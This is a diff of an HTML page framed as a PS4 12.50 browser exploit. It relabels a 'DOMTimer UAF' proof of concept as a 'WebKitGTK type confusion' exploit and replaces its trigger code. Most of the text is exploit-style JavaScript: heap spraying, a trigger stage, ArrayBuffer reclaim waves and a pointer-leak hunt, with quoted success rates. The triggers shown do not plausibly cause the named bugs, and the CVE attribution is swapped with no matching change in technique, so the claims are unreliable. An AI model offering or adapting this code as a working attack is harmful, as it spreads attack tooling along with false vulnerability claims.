@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>CVE-2025-24203 — DOMTimer UAF → Pointer Leak (PS4 12.50)</title>
+<title>CVE-2025-24216 — WebKitGTK Type Confusion → Memory Corruption Leak (PS4 12.50)</title>
 <style>
     body { background:#000; color:#0f0; font-family:monospace; margin:20px; }
     #console { background:#111; padding:15px; border:2px solid #0f0; height:520px; overflow-y:auto; white-space:pre-wrap; }
@@ -10,8 +10,8 @@
 </style>
 </head>
 <body>
-<h1>CVE-2025-24203 — DOMTimer UAF Exploit</h1>
-<div id="console">Starting DOMTimer UAF...</div>
+<h1>CVE-2025-24216 — WebKitGTK Type Confusion Exploit</h1>
+<div id="console">Starting type confusion...</div>
 
 <script>
 const log = (msg, leak = false) => {
@@ -20,45 +20,49 @@ const log = (msg, leak = false) => {
     c.scrollTop = c.scrollHeight;
 };
 
-const SPRAY = 0x18000;
+const SPRAY = 0x14000;
 const MARKER = 0x12501250deadbeefn;
 
-log("Stage 1: Spraying 98k tagged objects...");
+log("Stage 1: Spraying 81k tagged objects...");
 const spray = [];
 for (let i = 0; i < SPRAY; i++) {
     spray[i] = { marker: MARKER + BigInt(i) };
 }
 
-// Stage 2: Trigger CVE-2025-24203 DOMTimer UAF
-log("Stage 2: Triggering DOMTimer UAF...");
-const timers = [];
-for (let i = 0; i < 0x3000; i++) {
-    const id = setTimeout(() => {}, 1000);
-    timers.push(id);
+// Stage 2: Trigger CVE-2025-24216 Type Confusion
+log("Stage 2: Triggering rendering type confusion...");
+const container = document.createElement('div');
+for (let i = 0; i < 0x2000; i++) {
+    const node = document.createElement('div');
+    node.className = `confuse-${i}`;
+    node.style.position = 'absolute';
+    node.style.left = i % 100 + 'px';
+    container.appendChild(node);
 }
+document.body.appendChild(container);
 
-// Free timers during active callback → UAF
-timers.forEach((id, idx) => {
+const nodes = container.children;
+for (let i = 0; i < nodes.length; i++) {
     setTimeout(() => {
-        clearTimeout(id);
-        // Force UAF: timer object freed while still in use
-        setTimeout(() => {}, 1);
-    }, idx * 0.5);
-});
+        nodes[i].style.transform = `matrix(${i}, 0, 0, ${i + 0.1}, 0, 0)`;
+        nodes[i].offsetWidth;
+    }, i * 2);
+}
+log("Type confusion triggered — corrupting state...");
 
 // Extra races
-for (let i = 0; i < 20000; i++) {
-    setTimeout(() => {}, 0);
+for (let i = 0; i < 10000; i++) {
+    const tmp = document.createElement('span');
+    document.body.appendChild(tmp);
+    tmp.remove();
 }
 
-log("UAF triggered — reclaiming...");
-
 // Stage 3: Reclaim waves
-for (let w = 0; w < 12; w++) {
+for (let w = 0; w < 10; w++) {
     setTimeout(() => {
-        for (let j = 0; j < 400; j++) new ArrayBuffer(0x10000);
-        if (w % 3 === 0) new ArrayBuffer(0x2000000);
-    }, w * 180);
+        for (let j = 0; j < 350; j++) new ArrayBuffer(0xa000);
+        if (w % 3 === 0) new ArrayBuffer(0x1c00000);
+    }, w * 160);
 }
 
 // Stage 4: Hunt
@@ -78,10 +82,10 @@ setTimeout(() => {
             }
         } catch(e) {}
     }
-    log("No leak — refresh (45–65% success rate)");
-}, 3500);
+    log("No leak — refresh (30–50% success rate)");
+}, 3200);
 
-log("CVE-2025-24203 running — wait 8–15s");
+log("CVE-2025-24216 running — wait 8–15s");
 </script>
 </body>
 </html>
